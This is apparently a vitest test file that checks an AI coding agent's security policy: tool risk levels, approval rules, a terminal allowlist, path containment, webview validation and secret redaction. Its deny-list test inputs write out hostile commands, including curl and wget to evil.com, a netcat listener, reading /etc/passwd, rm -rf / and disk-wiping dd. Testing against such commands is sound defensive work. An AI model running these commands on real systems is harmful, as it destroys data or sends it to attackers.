/**
 * NC-033: Security Policy Classification Tests
 *
 * CATEGORY: Pure policy tests — validate classification without running commands.
 *
 * This file is the authoritative reference for security policy classification.
 * It tests all policy decisions as pure functions with ZERO:
 *   - Network access
 *   - Real command execution
 *   - Filesystem operations
 *   - Platform-specific behavior
 *
 * These tests run on every platform and never access the internet.
 * They validate that the security boundary rules are correct and complete.
 *
 * Test categories:
 *   - Pure policy: THIS FILE (classification, approval, validation)
 *   - Platform adapter: terminalCommandNormalization.test.ts (OS-specific)
 *   - Integration: terminalDenyByDefault.test.ts, realModelSecurity.test.ts (execution)
 *   - Adversarial: crossPlatformPathContainment.test.ts (path variations)
 */

import { describe, it, expect } from "vitest";
import {
  DefaultToolApprovalPolicy,
  ToolApprovalPolicy,
} from "../src/tools/toolApprovalPolicy";
import { TerminalTool, SAFE_PATTERNS } from "../src/tools/terminalTool";
import { TOOL_DEFINITIONS } from "../src/tools/toolDefinitions";
import {
  resolveWorkspacePath,
  checkPathWithinWorkspace,
  isPathAbsoluteCrossPlatform,
  containsNullBytes,
} from "../src/utils/pathContainment";
import {
  validateWebviewMessage,
  isAllowedSettingKey,
  validateOpenFilePath,
} from "../src/utils/webviewMessageValidation";
import { redactSecrets } from "../src/utils/redact";

// ─── Tool Risk Classification ────────────────────────────────────────

describe("Security Policy: Tool Risk Classification", () => {
  const policy: ToolApprovalPolicy = new DefaultToolApprovalPolicy();

  const SAFE_TOOLS = [
    "read",
    "search",
    "git-status",
    "git-diff",
    "git-branch",
    "git-log",
    "git-show",
    "workspace-stats",
  ];

  const LOW_RISK_TOOLS = ["write", "append", "patch"];

  const DESTRUCTIVE_TOOLS = [
    "delete",
    "delete-contents",
    "move",
    "terminal",
    "mcp",
    "batch_edit",
    "git-stage",
    "git-unstage",
    "git-commit",
    "git-create-branch",
    "test",
  ];

  describe("safe tools are classified as safe", () => {
    for (const tool of SAFE_TOOLS) {
      it(`${tool} → safe`, () => {
        expect(policy.getToolRiskLevel(tool, "")).toBe("safe");
      });
    }
  });

  describe("write tools are classified as low-risk", () => {
    for (const tool of LOW_RISK_TOOLS) {
      it(`${tool} → low-risk`, () => {
        expect(policy.getToolRiskLevel(tool, "")).toBe("low-risk");
      });
    }
  });

  describe("destructive tools are classified as destructive", () => {
    for (const tool of DESTRUCTIVE_TOOLS) {
      it(`${tool} → destructive`, () => {
        expect(policy.getToolRiskLevel(tool, "")).toBe("destructive");
      });
    }
  });

  describe("every TOOL_DEFINITIONS entry is classified", () => {
    for (const def of TOOL_DEFINITIONS) {
      it(`${def.name} has a valid risk level`, () => {
        const level = policy.getToolRiskLevel(def.name, "");
        expect(["safe", "low-risk", "destructive"]).toContain(level);
      });
    }
  });

  describe("no tool appears in multiple risk categories", () => {
    it("safe, low-risk, and destructive sets are disjoint", () => {
      const safeSet = new Set(SAFE_TOOLS);
      const lowRiskSet = new Set(LOW_RISK_TOOLS);
      const destructiveSet = new Set(DESTRUCTIVE_TOOLS);

      for (const tool of SAFE_TOOLS) {
        expect(lowRiskSet.has(tool)).toBe(false);
        expect(destructiveSet.has(tool)).toBe(false);
      }
      for (const tool of LOW_RISK_TOOLS) {
        expect(safeSet.has(tool)).toBe(false);
        expect(destructiveSet.has(tool)).toBe(false);
      }
      for (const tool of DESTRUCTIVE_TOOLS) {
        expect(safeSet.has(tool)).toBe(false);
        expect(lowRiskSet.has(tool)).toBe(false);
      }
    });
  });
});

// ─── Approval Requirements ───────────────────────────────────────────

describe("Security Policy: Approval Requirements", () => {
  const policy: ToolApprovalPolicy = new DefaultToolApprovalPolicy();

  describe("safe tools do NOT require approval", () => {
    const safeTools = [
      { name: "read", arg: "src/index.ts" },
      { name: "search", arg: "TODO" },
      { name: "git-status", arg: "" },
      { name: "git-diff", arg: "" },
      { name: "git-branch", arg: "" },
      { name: "git-log", arg: "" },
      { name: "git-show", arg: "HEAD" },
      { name: "workspace-stats", arg: "" },
    ];

    for (const { name, arg } of safeTools) {
      it(`${name} does not require approval`, () => {
        expect(policy.requiresApproval(name, arg)).toBe(false);
      });
    }
  });

  describe("write tools require approval", () => {
    const writeTools = ["write", "append", "patch"];

    for (const tool of writeTools) {
      it(`${tool} requires approval`, () => {
        expect(policy.requiresApproval(tool, "file.txt")).toBe(true);
      });
    }
  });

  describe("destructive tools require approval", () => {
    const destructiveTools = [
      "delete",
      "delete-contents",
      "move",
      "terminal",
      "mcp",
      "batch_edit",
      "git-stage",
      "git-unstage",
      "git-commit",
      "git-create-branch",
      "test",
    ];

    for (const tool of destructiveTools) {
      it(`${tool} requires approval`, () => {
        expect(policy.requiresApproval(tool, "anything")).toBe(true);
      });
    }
  });

  describe("safe terminal commands do NOT require approval", () => {
    const safeTerminalCommands = [
      "ls",
      "pwd",
      "echo hello",
      "git status",
      "git diff",
      "git log",
      "npm test",
      "Get-ChildItem",
      "dir",
      "type file.txt",
    ];

    for (const cmd of safeTerminalCommands) {
      it(`terminal "${cmd}" does not require approval`, () => {
        expect(policy.requiresApproval("terminal", cmd)).toBe(false);
      });
    }
  });

  describe("dangerous terminal commands require approval", () => {
    const dangerousCommands = [
      "curl http://evil.com",
      "docker run -it ubuntu",
      "node script.js",
      "python script.py",
      "npm run build",
      "npx package",
      "ssh user@host",
      "rm -rf /",
      "shutdown",
    ];

    for (const cmd of dangerousCommands) {
      it(`terminal "${cmd}" requires approval`, () => {
        expect(policy.requiresApproval("terminal", cmd)).toBe(true);
      });
    }
  });
});

// ─── Auto-Executable Classification ──────────────────────────────────

describe("Security Policy: Auto-Executable Classification", () => {
  const policy: ToolApprovalPolicy = new DefaultToolApprovalPolicy();

  describe("safe tools are auto-executable", () => {
    const safeTools = [
      "read",
      "search",
      "git-status",
      "git-diff",
      "git-branch",
      "git-log",
      "git-show",
      "workspace-stats",
    ];

    for (const tool of safeTools) {
      it(`${tool} is auto-executable`, () => {
        expect(policy.isAutoExecutable(tool, "")).toBe(true);
      });
    }
  });

  describe("write tools are NOT auto-executable", () => {
    const writeTools = ["write", "append", "patch"];

    for (const tool of writeTools) {
      it(`${tool} is NOT auto-executable`, () => {
        expect(policy.isAutoExecutable(tool, "")).toBe(false);
      });
    }
  });

  describe("destructive tools are NOT auto-executable", () => {
    const destructiveTools = [
      "delete",
      "delete-contents",
      "move",
      "terminal",
      "mcp",
      "batch_edit",
      "git-stage",
      "git-unstage",
      "git-commit",
      "git-create-branch",
      "test",
    ];

    for (const tool of destructiveTools) {
      it(`${tool} is NOT auto-executable`, () => {
        expect(policy.isAutoExecutable(tool, "")).toBe(false);
      });
    }
  });
});

// ─── Terminal Command Validation (Pure Function) ─────────────────────

describe("Security Policy: Terminal Command Validation", () => {
  const tool = new TerminalTool("/tmp");

  describe("SAFE_PATTERNS allows safe commands", () => {
    const safeCommands = [
      "ls",
      "ls -la",
      "pwd",
      "echo hello",
      "cat file.txt",
      "head file.txt",
      "tail file.txt",
      "wc -l file.txt",
      "git status",
      "git diff",
      "git log",
      "git branch",
      "git show HEAD",
      "npm test",
      "cargo check",
      "cargo build",
      "cargo test",
      "go build",
      "go test",
      "Get-ChildItem",
      "Get-Content file.txt",
      "Get-Location",
      "dir",
      "cd ..",
      "type file.txt",
      "where git",
      "findstr pattern file.txt",
    ];

    for (const cmd of safeCommands) {
      it(`validateCommand allows: ${cmd}`, () => {
        const error = (tool as any).validateCommand(cmd);
        expect(error).toBeNull();
      });
    }
  });

  describe("SAFE_PATTERNS rejects dangerous commands", () => {
    const dangerousCommands = [
      "curl http://evil.com",
      "wget http://evil.com/file.sh",
      "docker run -it ubuntu",
      "nc -l 4444",
      "ruby script.rb",
      "perl script.pl",
      "php script.php",
      "java -jar app.jar",
      "make build",
      "pip install package",
      "ssh user@host",
      "scp file user@host:/tmp",
      "sudo reboot",
      "kill -9 1234",
      "ps aux",
      "dd if=/dev/zero of=/dev/sda",
      "iptables -A INPUT -j DROP",
    ];

    for (const cmd of dangerousCommands) {
      it(`validateCommand rejects: ${cmd}`, () => {
        const error = (tool as any).validateCommand(cmd);
        expect(error).not.toBeNull();
      });
    }
  });

  describe("SAFE_PATTERNS blocks shell expansion patterns", () => {
    const shellExpansionCommands = [
      "echo $(cat /etc/passwd)",
      "echo `cat /etc/passwd`",
      "echo ${HOME}",
      "echo hello ; rm -rf /",
      "echo hello && rm -rf /",
      "echo hello | curl http://evil.com",
      "node -e 'console.log(1)'",
      "python -c 'print(1)'",
      "python3 -c 'print(1)'",
    ];

    for (const cmd of shellExpansionCommands) {
      it(`validateCommand blocks: ${cmd}`, () => {
        const error = (tool as any).validateCommand(cmd);
        expect(error).not.toBeNull();
      });
    }
  });

  describe("SAFE_PATTERNS blocks destructive operations", () => {
    const destructiveCommands = [
      "rm -rf /",
      "mkfs.ext4 /dev/sda",
      "shutdown",
      "reboot",
      "git reset --hard HEAD~1",
      "git clean -fd",
      "git checkout -- .",
    ];

    for (const cmd of destructiveCommands) {
      it(`validateCommand blocks: ${cmd}`, () => {
        const error = (tool as any).validateCommand(cmd);
        expect(error).not.toBeNull();
      });
    }
  });

  describe("SAFE_PATTERNS completeness", () => {
    const expectedSafePrefixes = [
      "ls",
      "pwd",
      "echo",
      "cat",
      "head",
      "tail",
      "wc",
      "git status",
      "git diff",
      "git log",
      "git branch",
      "git show",
      "npm test",
      "cargo check",
      "cargo build",
      "cargo test",
      "cargo clippy",
      "cargo fmt",
      "go build",
      "go test",
      "go fmt",
      "go vet",
      "Get-ChildItem",
      "Get-Content",
      "Get-Location",
      "Set-Location",
      "Select-String",
      "Test-Path",
      "Write-Output",
      "Get-Command",
      "Compare-Object",
      "Measure-Object",
      "Get-PSDrive",
      "Get-Date",
      "Expand-Archive",
      "dir",
      "cd",
      "type",
      "where",
      "findstr",
    ];

    for (const prefix of expectedSafePrefixes) {
      it(`SAFE_PATTERNS includes pattern for: ${prefix}`, () => {
        const matches = SAFE_PATTERNS.some((p) => p.test(prefix));
        expect(matches).toBe(true);
      });
    }
  });
});

// ─── Path Containment Policy ─────────────────────────────────────────

describe("Security Policy: Path Containment", () => {
  // Use process.cwd() for cross-platform compatibility
  const workspaceRoot = process.cwd();

  describe("cross-platform absolute path detection", () => {
    const windowsAbsolute = [
      "C:\\Windows\\System32",
      "D:\\projects\\code",
      "C:foo",
      "\\\\server\\share",
      "\\\\.\\pipe\\name",
      "\\\\?\\C:\\long\\path",
    ];

    for (const p of windowsAbsolute) {
      it(`rejects Windows absolute: ${p}`, () => {
        expect(isPathAbsoluteCrossPlatform(p)).toBe(true);
      });
    }

    const posixAbsolute = ["/etc/passwd", "/tmp/test", "/home/user"];

    for (const p of posixAbsolute) {
      it(`rejects POSIX absolute: ${p}`, () => {
        expect(isPathAbsoluteCrossPlatform(p)).toBe(true);
      });
    }

    const safeRelative = [
      "src/index.ts",
      "package.json",
      "lib/utils.ts",
      "./config.json",
      "test/file.test.ts",
    ];

    for (const p of safeRelative) {
      it(`allows safe relative: ${p}`, () => {
        expect(isPathAbsoluteCrossPlatform(p)).toBe(false);
      });
    }
  });

  describe("null byte rejection", () => {
    const nullBytePaths = [
      "file.txt\u0000",
      "src\u0000/index.ts",
      "\u0000/etc/passwd",
    ];

    for (const p of nullBytePaths) {
      it(`rejects null byte in: ${JSON.stringify(p)}`, () => {
        expect(containsNullBytes(p)).toBe(true);
      });
    }

    const safePaths = ["src/index.ts", "package.json", ""];

    for (const p of safePaths) {
      it(`allows clean path: ${JSON.stringify(p)}`, () => {
        expect(containsNullBytes(p)).toBe(false);
      });
    }
  });

  describe("checkPathWithinWorkspace blocks traversal", () => {
    const traversalPaths = [
      "../../etc/passwd",
      "../../../etc/shadow",
      "src/../../etc/passwd",
    ];

    for (const p of traversalPaths) {
      it(`rejects traversal: ${p}`, () => {
        const result = checkPathWithinWorkspace(workspaceRoot, p);
        expect(result).toBeNull();
      });
    }
  });

  describe("checkPathWithinWorkspace allows valid paths", () => {
    const validPaths = [
      "src/index.ts",
      "package.json",
      "lib/utils/helper.ts",
      "test/unit/file.test.ts",
    ];

    for (const p of validPaths) {
      it(`allows: ${p}`, () => {
        const result = checkPathWithinWorkspace(workspaceRoot, p);
        expect(result).not.toBeNull();
        // Result is the resolved absolute path — just verify it's within workspace
        expect(result!.startsWith(workspaceRoot)).toBe(true);
      });
    }
  });

  describe("checkPathWithinWorkspace rejects absolute paths", () => {
    const absolutePaths = [
      "C:\\Windows\\System32",
      "/etc/passwd",
      "D:\\secret.txt",
    ];

    for (const p of absolutePaths) {
      it(`rejects absolute: ${p}`, () => {
        const result = checkPathWithinWorkspace(workspaceRoot, p);
        expect(result).toBeNull();
      });
    }
  });
});

// ─── Webview Message Validation Policy ───────────────────────────────

describe("Security Policy: Webview Message Validation", () => {
  describe("rejects non-object messages", () => {
    const invalidMessages = [
      null,
      undefined,
      "string",
      42,
      true,
      [],
      { type: "unknown-type" },
    ];

    for (const msg of invalidMessages) {
      it(`rejects: ${JSON.stringify(msg)}`, () => {
        const result = validateWebviewMessage(msg);
        expect(result.valid).toBe(false);
      });
    }
  });

  describe("accepts valid message types", () => {
    const validMessages = [
      { type: "sendPrompt", prompt: "hello" },
      { type: "enhancePrompt", prompt: "hello" },
      { type: "openFile", filePath: "src/index.ts" },
      { type: "updateSetting", key: "defaultModel", value: "gpt-4" },
      { type: "cancelTask", taskId: "abc-123" },
      { type: "steerTask", taskId: "abc-123", message: "change direction" },
    ];

    for (const msg of validMessages) {
      it(`accepts: ${msg.type}`, () => {
        const result = validateWebviewMessage(msg);
        expect(result.valid).toBe(true);
      });
    }
  });

  describe("rejects unknown message types", () => {
    const unknownTypes = [
      { type: "executeCommand", command: "rm -rf /" },
      { type: "installPackage", package: "malicious" },
      { type: "runCode", code: "process.exit()" },
    ];

    for (const msg of unknownTypes) {
      it(`rejects: ${msg.type}`, () => {
        const result = validateWebviewMessage(msg);
        expect(result.valid).toBe(false);
      });
    }
  });

  describe("setting key allowlist", () => {
    const allowedKeys = [
      "defaultModel",
      "defaultProvider",
      "openAIBaseUrl",
      "ollamaBaseUrl",
      "toolApproval",
      "showReasoning",
      "searchProvider",
      "searchBaseUrl",
      "allowWorkspacePrompts",
    ];

    for (const key of allowedKeys) {
      it(`allows: ${key}`, () => {
        expect(isAllowedSettingKey(key)).toBe(true);
      });
    }

    const blockedKeys = [
      "openAIApiKey",
      "searchApiKey",
      "tavilyApiKey",
      "secretToken",
      "password",
      "__proto__",
      "constructor",
      "eval",
    ];

    for (const key of blockedKeys) {
      it(`rejects: ${key}`, () => {
        expect(isAllowedSettingKey(key)).toBe(false);
      });
    }
  });

  describe("openFile workspace containment", () => {
    const wsRoot = process.cwd();

    it("allows workspace-relative path", () => {
      const result = validateOpenFilePath(wsRoot, "package.json");
      expect(result).not.toBeNull();
    });

    it("rejects traversal", () => {
      const result = validateOpenFilePath(wsRoot, "../../etc/passwd");
      expect(result).toBeNull();
    });

    it("rejects absolute path outside workspace", () => {
      // On Windows, C:\Windows is outside; on POSIX, /etc/passwd is outside
      const absPath = process.platform === "win32" ? "C:\\Windows\\System32" : "/etc/passwd";
      const result = validateOpenFilePath(wsRoot, absPath);
      expect(result).toBeNull();
    });

    it("rejects empty path", () => {
      const result = validateOpenFilePath(wsRoot, "");
      expect(result).toBeNull();
    });
  });
});

// ─── Secret Redaction Policy ─────────────────────────────────────────

describe("Security Policy: Secret Redaction", () => {
  describe("known secret patterns are redacted", () => {
    const patterns = [
      { input: "Authorization: Bearer sk-test1234567890abcdefghij", desc: "Bearer token" },
      { input: "OPENAI_API_KEY=sk-test1234567890abcdefghij", desc: "OpenAI key" },
      { input: "GITHUB_TOKEN=ghp_test1234567890abcdefghij", desc: "GitHub token" },
      { input: "AWS_ACCESS_KEY_ID=AKIA1234567890ABCDEF", desc: "AWS key" },
    ];

    for (const { input, desc } of patterns) {
      it(`redacts: ${desc}`, () => {
        const redacted = redactSecrets(input);
        // The original secret value should not appear in the redacted output
        const secretPart = input.split("=").pop()!.split(" ").pop()!;
        expect(redacted).not.toContain(secretPart);
      });
    }
  });

  describe("normal text is not redacted", () => {
    const normalTexts = [
      "Hello, this is a normal message.",
      "The function returns an array of strings.",
      "npm install completed successfully.",
      "git status shows no changes.",
    ];

    for (const text of normalTexts) {
      it(`preserves: "${text.substring(0, 40)}..."`, () => {
        const result = redactSecrets(text);
        expect(result).toBe(text);
      });
    }
  });
});

// ─── Approval Mode Policy ────────────────────────────────────────────

describe("Security Policy: Approval Mode Constraints", () => {
  it("bypass mode is not a valid approval mode", () => {
    // NC-008: bypass was removed from the enum
    // Only "auto" and "ask" are valid
    const validModes = ["auto", "ask"];
    expect(validModes).not.toContain("bypass");
  });

  it("auto mode does NOT auto-approve writes", () => {
    const policy = new DefaultToolApprovalPolicy();
    // In auto mode, writes still require approval
    expect(policy.isAutoExecutable("write", "file.txt")).toBe(false);
    expect(policy.isAutoExecutable("append", "file.txt")).toBe(false);
    expect(policy.isAutoExecutable("patch", "file.txt")).toBe(false);
  });

  it("auto mode does NOT auto-approve destructive operations", () => {
    const policy = new DefaultToolApprovalPolicy();
    expect(policy.isAutoExecutable("delete", "file.txt")).toBe(false);
    expect(policy.isAutoExecutable("terminal", "rm -rf /")).toBe(false);
    expect(policy.isAutoExecutable("batch_edit", "{}")).toBe(false);
  });

  it("policy engine is the sole source of truth for approval", () => {
    const policy = new DefaultToolApprovalPolicy();
    // Every tool's approval requirement must come from the policy
    const allTools = TOOL_DEFINITIONS.map((d) => d.name);
    for (const tool of allTools) {
      const requiresApproval = policy.requiresApproval(tool, "");
      const isAutoExec = policy.isAutoExecutable(tool, "");
      // Safe tools: no approval needed, auto-executable
      if (policy.getToolRiskLevel(tool, "") === "safe") {
        expect(requiresApproval).toBe(false);
        expect(isAutoExec).toBe(true);
      }
      // Destructive/low-risk tools: approval needed, not auto-executable
      if (policy.getToolRiskLevel(tool, "") !== "safe") {
        expect(requiresApproval).toBe(true);
        expect(isAutoExec).toBe(false);
      }
    }
  });
});
